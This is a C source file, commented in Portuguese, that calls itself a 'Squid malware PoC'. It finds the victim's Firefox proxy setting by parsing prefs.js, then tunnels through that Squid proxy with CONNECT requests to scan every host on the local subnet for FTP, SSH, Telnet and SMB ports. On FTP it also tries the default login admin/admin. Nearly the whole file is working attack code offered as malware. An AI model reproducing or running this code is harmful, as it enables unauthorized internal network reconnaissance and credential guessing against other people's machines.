/*
	SQUID MALWARE PoC
	COMPILA COM: $ gcc Malware_PoC.c -lcurl -o PoC
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <errno.h>
#include <regex.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <curl/curl.h> 
#include <sys/wait.h>
#include <math.h>

/* getifaddrs & rtnl_link_stats */
#include <netdb.h>
#include <ifaddrs.h>
#include <linux/if_link.h>


void erro_fatal(const char *);			/* Encerra o programa com mensagem de erro */
int detecta_firefox(void);			/* Detecta diretório do Firefox, retorna 0 se existente */
char * dir_perfil_firefox(const char *);	/* Caminho do diretório do perfil default */
struct sockaddr_in * get_ip_proxy_firefox(char const *);	/* Retorna endereço IP do proxy configurado no Firefox */
int conexao_proxy_test(const struct sockaddr_in *);		/* Testa se o proxy está online, retorna o fd */
char * strncat_new(const char *, const char *, size_t);		/* Versão modificada do strncat */
struct net ip_host(void);			/* Retorna endereço IP do host infectado */
unsigned int bit_num(unsigned int);		/* Retorna quantidade de bits 1 em um inteiro */
void squid_portscan(const struct sockaddr_in *);	/* Com base no IP e porta do proxy, escanear host usando CONNECT */
void filho(struct in_addr, CURL *);	/* Realiza portscan */
void banner(void);

struct nic {
	unsigned tx_packets_aux;
	char *dev;
} interface_escolhida = {0, NULL};

struct net {
	struct sockaddr_in ip;
	struct sockaddr_in mask;
} addr_ipv4;

char * caminho_mozilla = NULL;	/* Variável global lida por várias funções, armazena
				   o caminho do diretório .mozilla/firefox do usuário */

unsigned short int portas_alvo[4]={21, 22, 23, 445};

int 
main(void) {
	char * perfil = NULL;
	struct sockaddr_in * dados_proxy = NULL;

	banner();
	if((detecta_firefox()) == 1) {
		erro_fatal("Diretório do Firefox não existe!");
	}

	perfil = dir_perfil_firefox(caminho_mozilla);

#ifdef DEBUG
	printf(" [DEBUG] Firefox: %s\n", caminho_mozilla);
	printf(" [DEBUG] Perfil: %s\n", perfil);

	printf(" [DEBUG] Caminho do perfil: %s\n\n", strncat_new(perfil, "/prefs.js", strlen("/prefs.js")));
#endif
	dados_proxy = get_ip_proxy_firefox(strncat_new(perfil, "/prefs.js", strlen("/prefs.js")));

#ifdef DEBUG
	printf(" [DEBUG] Proxy IP:\t %s\n", inet_ntoa(dados_proxy->sin_addr));
	printf(" [DEBUG] Proxy Porta:\t %d\n", ntohs(dados_proxy->sin_port));
#endif

	squid_portscan(dados_proxy);

#ifdef DEBUG
	puts("");
#endif

	free(dados_proxy);
	exit(EXIT_SUCCESS);
}

void 
erro_fatal(const char * msg) {

#ifdef DEBUG
    fprintf(stderr, " ERRO: %s\n", msg);
#endif

    exit(EXIT_FAILURE);
}

int 
detecta_firefox(void) {
	uid_t id;
	int string_size;	
	struct passwd * user;
	struct stat inode;

	/* Inicia com uma barra para ser concatenado corretamente */
	char * dir_name = "/.mozilla/firefox/";

	id = getuid();
	user = getpwuid(id);

	string_size = strlen(user->pw_dir);

	caminho_mozilla = strncat(user->pw_dir, dir_name, strlen(dir_name));

	/* Verifica se o caminho absoluto do Firefox existe */
	if(!(stat(caminho_mozilla, &inode))) {
		if(S_ISDIR(inode.st_mode)) {
			/* Diretório encontrado! */
			return 0;
		} else {
			/* Diretório NÃO encontrado! */
			return 1;
		}
	} else {
		/* Se por algum motivo o stat() não funfar... */
		erro_fatal("detecta_firefox: stat()");
	}
}

/*
 Recebe como argumento uma string contendo o caminho absoluto
 do diretório .mozilla/firefox. 
 Ex: /home/kingm0b_/.mozilla/firefox/
*/
char * 
dir_perfil_firefox(const char * caminho_diretorio) {
	struct stat inode;
	char * profile = NULL;

	if(caminho_diretorio != NULL) {

		profile = strncat_new(caminho_diretorio, "profiles.ini", strlen("profiles.ini"));

		if(!(stat(profile, &inode)) ) {
			if(S_ISREG(inode.st_mode)) {
				FILE * diretorio_default = NULL;
				diretorio_default = fopen(profile, "r");

				if(diretorio_default != NULL) {
					char linha[100];
					short int c = 0;
					while((fscanf(diretorio_default, "%s", linha)) == 1) {
						if(c == 1) {
							if(!(strncmp(linha, "Path=", strlen("Path="))) ) {
								char * diretorio = linha + 5;
								return strncat_new(caminho_diretorio, diretorio, strlen(diretorio));
							}
						}

						if(!(strncmp(linha, "Name=default", strlen("Name=default"))) )
							c = 1;
					}


					return NULL;
				} else {
					erro_fatal("fopen()");
				}

			} else {
				/* Arquivo NÃO encontrado! */
				return NULL;
			}			
		} else {
			/* Se por algum motivo o stat() não funfar... */
			erro_fatal("dir_perfil_firefox: stat()");
		}
	} else {
		/* Caminho inválido! */
		return NULL;
	}
}

/* 
 Versão modificada do strncat(), retorna um novo destino,
 sem modificar o primeiro parâmetro
*/

char * 
strncat_new(const char *dest, const char *src, size_t n) {
	size_t dest_len = strlen(dest);
	size_t i;

	/* Nunca se esqueça do bendito "+ 1" para o '\0' no final :¬)  */
	char * new_dest = (char *) malloc(sizeof(char) * (dest_len + n + 1));
	bzero(new_dest, sizeof(char) * (dest_len + n));
	strncpy(new_dest, dest, dest_len);

	for (i = 0 ; i < n && src[i] != '\0' ; i++)
		new_dest[dest_len + i] = src[i];
	new_dest[dest_len + i] = '\0';

	return new_dest;
}


/*
 Recebe como argumento o caminho absoluto do arquivo prefs.js e retorna
 o endereço IP do proxy juntamente com a porta utilizada em uma estrutura
 sockaddr_in
*/
struct sockaddr_in *
get_ip_proxy_firefox(const char * arquivo_prefs) {
	if(arquivo_prefs != NULL) {

			FILE * prefs = NULL;
			prefs = fopen(arquivo_prefs, "r");

			if(prefs != NULL) {
				char linha[1024];
				regex_t ip_addr;
				regex_t line;
				regex_t port_addr;
				regmatch_t batida[1];

				struct sockaddr_in * dados_proxy_server;

				regcomp(&line, "network\\.proxy\\.http.*", REG_EXTENDED);
				regcomp(&ip_addr, "([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3}\\.[0-9]{1,3})", REG_EXTENDED);
				regcomp(&port_addr, "[[:digit:]]{1,5}", REG_EXTENDED);

				while((fscanf(prefs, "%1023s", linha)) == 1) {

					if(!(regexec(&line, linha, 0, NULL, 0 ))) {

						fscanf(prefs, "%1023s", linha);
						if(!(regexec(&ip_addr, linha, 1, batida, 0 ))) {
							dados_proxy_server = (struct sockaddr_in *) malloc(sizeof(struct sockaddr_in));
							memset(dados_proxy_server, 0x0, sizeof(struct sockaddr));

							linha[batida[0].rm_eo] = '\0';
							dados_proxy_server->sin_addr.s_addr = inet_addr(linha+(batida[0].rm_so));

							/* Lê o lixo */
							fscanf(prefs, "%s", linha);

							/* Lê a porta */
							fscanf(prefs, "%s", linha);
							regexec(&port_addr, linha, 1, batida, 0 );
							linha[batida[0].rm_eo] = '\0';
							dados_proxy_server->sin_port = htons(atoi(linha+(batida[0].rm_so)));

							return dados_proxy_server;

						}

					}
				}

				return NULL;

			} else {
				erro_fatal("get_ip_proxy_firefox: fopen()");
			}



	} else {
		erro_fatal("get_ip_proxy_firefox: arquivo prefs.js inválido!");
	}
}


int
conexao_proxy_test(const struct sockaddr_in * proxy) {
	int s0ck;

	s0ck = socket(AF_INET, SOCK_STREAM, 0);

	if ((connect(s0ck, (struct sockaddr *) proxy, sizeof(struct sockaddr_in))) == 0) {
		return 0;
	} else {
		return 1;
	}
}

struct net ip_host(void) {
	struct ifaddrs *ifaddr, *prox;

	int familia_addr, r;
	char ip[NI_MAXHOST], mask[NI_MAXHOST];

	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs");
		exit(EXIT_FAILURE);
	}

	for(prox = ifaddr; prox != NULL; prox = prox->ifa_next) {
		if ((prox->ifa_addr == NULL) || !(strncmp(prox->ifa_name, "lo", 2)))
			continue;

		familia_addr = prox->ifa_addr->sa_family;

		if (familia_addr == AF_PACKET && prox->ifa_data != NULL) {
			struct rtnl_link_stats *stats = prox->ifa_data;

			if(interface_escolhida.tx_packets_aux < stats->tx_packets) {
				interface_escolhida.tx_packets_aux = stats->tx_packets;
				interface_escolhida.dev = prox->ifa_name;
			}
		}

	}

	for(prox = ifaddr; prox != NULL; prox = prox->ifa_next) {
		familia_addr = prox->ifa_addr->sa_family;
		if (!(strncmp(prox->ifa_name, interface_escolhida.dev, strlen(interface_escolhida.dev)))) {

			if(familia_addr == AF_INET) {
#ifdef DEBUG	
				r = getnameinfo(prox->ifa_addr, sizeof(struct sockaddr_in), ip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
				r = getnameinfo(prox->ifa_netmask, sizeof(struct sockaddr_in), mask, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
	
				if(r != 0)
					erro_fatal("ip_host: getnameinfo()");
	
				printf(" [DEBUG]\n  Interface: %s\n  IP: %s\n  Mask: %s\n\n", prox->ifa_name, ip, mask);
#endif

				addr_ipv4.ip = *((struct sockaddr_in *) prox->ifa_addr);
				addr_ipv4.mask = *((struct sockaddr_in *) prox->ifa_netmask);

				return addr_ipv4;
			}
		}
	}

	freeifaddrs(ifaddr);
}

/* 
   Créditos: http://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetParallel
*/
unsigned int bit_num(unsigned int v) {
	unsigned int c = 0;

	c = v - ((v >> 1) & 0x55555555);
	c = ((c >> 2) & 0x33333333) + (c & 0x33333333);
	c = ((c >> 4) + c) & 0x0F0F0F0F;
	c = ((c >> 8) + c) & 0x00FF00FF;
	c = ((c >> 16) + c) & 0x0000FFFF;

	return c;
}

void filho(struct in_addr ip_host, CURL * curl) {
	CURLcode code;

	char * ip;
	ip = inet_ntoa(ip_host);

	char * ftp_comandos[] = {"USER admin\n", "PASS admin\n", "QUIT\n"};

	size_t bytes;

	for (int c = 0; c < 4; c++) {
		char requisicao[64];

		sprintf(requisicao, "%s:%d", ip, portas_alvo[c]);

		/* Monta requisicao */
		curl_easy_setopt(curl, CURLOPT_URL, requisicao);

		CURLcode code;
		code = curl_easy_perform(curl);

		if ((code == CURLE_OK) || (code == CURLE_UNSUPPORTED_PROTOCOL) ) {
			if(portas_alvo[0] == 21) {
				char buffer[1024];
				for(int i = 0; i < 3; i++) {
					curl_easy_recv(curl, buffer, 1024, &bytes);
					printf(" Conteúdo do buffer:\n %s\n\n", buffer);
					curl_easy_send(curl, ftp_comandos[i], strlen(ftp_comandos[i]),  &bytes);
				}
			}

			printf("\n Host: %s\n Porta %d aberta!\n Código de retorno: %d\n", ip, portas_alvo[c], code);
		}
	}

}

void squid_portscan(const struct sockaddr_in * ip_proxy) {
	CURL * curl;
	CURLcode res;

	char * ip;
	unsigned int porta;

	struct net meu_ip;

	ip = inet_ntoa(ip_proxy->sin_addr);
	porta = ntohs(ip_proxy->sin_port);

	curl = curl_easy_init();

	if(curl) {
		/* Conecta no servidor proxy */
		curl_easy_setopt(curl, CURLOPT_PROXY, ip);
		curl_easy_setopt(curl, CURLOPT_PROXYPORT, (long) porta);

		/* Configurações para requisições CONNECT */
		curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
		curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);
		curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

		/* Define timeout de 3 segundos */
		curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);

		/* Escreve saída no /dev/null */
		FILE * sem_output = fopen("/dev/null", "w");
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, sem_output);

		meu_ip = ip_host();
		unsigned int rede_addr = meu_ip.ip.sin_addr.s_addr & meu_ip.mask.sin_addr.s_addr;

		int possibilidades = (int) pow( 2, bit_num( ~(ntohl(meu_ip.mask.sin_addr.s_addr)) )) - 2;

		pid_t info = 0;
		pid_t pid[possibilidades];

		for (int host = 1; host < possibilidades; host++) {
			struct in_addr vitima = {.s_addr = (rede_addr) + htonl(host)};

			pid_t pid_aux = fork();

			if ( pid_aux == 0) {
				filho(vitima, curl);

				/* Encerra o filho */
				exit(0);

			} else {
				pid[host - 1] = pid_aux;
			}
		}


		/* Espera o término dos filhos! */
		for(int filho = 0; filho < possibilidades - 1; filho++) {
			int status;
			do {
				info = waitpid(pid[filho], &status, 0);
				if (info == -1) {
					erro_fatal("waitpid");
				}
			} while (!WIFEXITED(status));

		}

	} else {
		printf(" Curl não inicializada!\n");
	}

}

void banner(void) {
   puts("\n\n   ██████   █████   █    ██  ██▓▓█████▄     ███▄ ▄███▓ ▄▄▄       ██▓     █     █░ ▄▄▄       ██▀███  ▓█████ \n"
	" ▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▓██▒▒██▀ ██▌   ▓██▒▀█▀ ██▒▒████▄    ▓██▒    ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ \n"
	" ░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒██▒░██   █▌   ▓██    ▓██░▒██  ▀█▄  ▒██░    ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   \n"
	"   ▒   ██▒░██  █▀ ░▓▓█  ░██░░██░░▓█▄   ▌   ▒██    ▒██ ░██▄▄▄▄██ ▒██░    ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ \n"
	" ▒██████▒▒░▒███▒█▄ ▒▒█████▓ ░██░░▒████▓    ▒██▒   ░██▒ ▓█   ▓██▒░██████▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒\n"
	" ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒ ░▓   ▒▒▓  ▒    ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░\n"
	" ░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░  ▒ ░ ░ ▒  ▒    ░  ░      ░  ▒   ▒▒ ░░ ░ ▒  ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░\n"
	" ░  ░  ░     ░   ░  ░░░ ░ ░  ▒ ░ ░ ░  ░    ░      ░     ░   ▒     ░ ░     ░   ░    ░   ▒     ░░   ░    ░   \n"
	"       ░      ░       ░      ░     ░              ░         ░  ░    ░  ░    ░          ░  ░   ░        ░  ░\n"
	"                                 ░                                                                         \n\n");

}











